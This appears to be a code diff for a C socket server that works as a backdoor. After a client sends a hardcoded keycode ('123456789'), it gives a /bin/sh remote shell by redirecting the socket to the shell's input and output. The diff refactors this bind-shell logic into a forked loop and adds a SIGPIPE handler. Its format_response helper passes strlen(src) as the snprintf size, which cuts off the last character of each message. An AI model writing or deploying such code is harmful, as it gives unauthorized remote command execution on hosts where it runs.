@@ -3,46 +3,80 @@
 #define MAX_CLIENTS 3
 
 int active_connections = 0;
-pthread_mutex_t connection_mutex = PTHREAD_MUTEX_INITIALIZER;
+int sig; 
+
+void sig_handler(int signal) {
+    sig = signal;
+}
+
+void format_response(char *dest, char *src) {
+    memset(dest, 0, 1024);
+    snprintf(dest, strlen(src), "%s", src);
+}
+
+int handle_recv(int client_socket) {
+    char response[1024];
+    char buffer[1024];
+
+    while (1) {
+        send(client_socket, "$> ", 3, 0);
+        memset(buffer, 0, 1024);
+        ssize_t valread = read(client_socket, buffer, sizeof(buffer) - 1);
+        if (valread <= 0 || sig == SIGPIPE) {
+            break ;
+        }
+        buffer[valread] = '\0';
+        if (!strncmp(buffer, "shell", strlen("shell"))) {
+            pid_t pid = fork();
+            if (pid == 0) {
+                dup2(client_socket, 0);
+                dup2(client_socket, 1);
+                dup2(client_socket, 2);
+                char * const argv[] = {"/bin/sh", NULL};
+                execve("/bin/sh", argv, NULL);
+            }
+            waitpid(pid, NULL, 0);
+        } else {
+            format_response(response,"Command not found\n");
+            send(client_socket, response, strlen(response), 0);
+        } 
+        if (!strncmp(buffer, "quit", 4)) {
+            break ;
+        }
+    }
+    return 1;
+}
 
 void *handle_client(void *arg)
 {
     int client_socket = *(int *)arg;
-
     char buffer[1024];
     char keycode[1024] = "123456789";
-
+    char response[1024];
     memset(buffer, 0, 1024);
-    send(client_socket, "Enter the keycode\n", strlen("Enter the keycode\n"), 0);
+
     while (1) {
         ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
-        if (!strncmp(buffer, keycode, strlen(keycode))) {
-            send(client_socket, "Connection established, welcome\n", strlen("Connection established, welcome\n"), 0);
-            break ;
-        } else {
-            send(client_socket, "Connection failed\n", strlen("Connection failed\n"), 0);
-        }
-    }
-
-    memset(buffer, 0, 1024);
-    while (1) {
-        ssize_t valread = read(client_socket, buffer, sizeof(buffer) - 1);
-        if (valread <= 0) {
-            break;
-        }
         buffer[valread] = '\0';
-        printf("Received: %s\n", buffer);
-        if (!strncmp(buffer, "shell", strlen("shell"))) {
-            dup2(client_socket, 0);
-            dup2(client_socket, 1);
-            dup2(client_socket, 2);
-            char * const argv[] = {"/bin/sh", NULL};
-            execve("/bin/sh", argv, NULL);
+        printf("%s\n", buffer);
+        break ;
+    }
+    while (1) {
+        memset(buffer, 0, 1024);
+        format_response(response, "Enter the keycode: ");
+        send(client_socket, response, strlen(response), 0);
+        ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
+        buffer[valread] = '\0';
+        if (sig == SIGPIPE || valread <= 0)
+            break ;
+        if (!strncmp(buffer, keycode, strlen(keycode))) {
+            format_response(response, "Connection established, welcome\n");
+            send(client_socket, response, strlen(response), 0);
+            if (handle_recv(client_socket))
+                break ;
         } else {
-            send(client_socket, "Connection established\n", strlen("Connection established\n"), 0);
-        }
-        if (!strncmp(buffer, "quit", 4)) {
-            break;
+            format_response(response, "Connection failed\n\n");
+            send(client_socket, response, strlen(response), 0);
         }
     }
 
@@ -97,6 +131,7 @@ void start_socket_listener()
 int main(int ac, char **av) {
     (void)ac;
     (void)av;
+    signal(SIGPIPE, sig_handler); 
     start_socket_listener();
     return 0;
 }
